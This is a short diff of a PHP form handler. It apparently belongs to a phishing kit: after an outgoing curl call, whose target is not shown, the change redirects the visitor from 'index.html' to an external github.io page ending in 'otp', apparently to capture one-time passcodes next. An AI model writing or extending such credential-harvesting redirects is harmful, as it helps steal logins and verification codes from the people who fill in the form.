@@ -24,7 +24,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     curl_close($ch);
 
    
-    header('Location: index.html');
+    header('Location: https://mipxers.github.io/tamara.github.io/otp');
     exit;
 }
 ?>
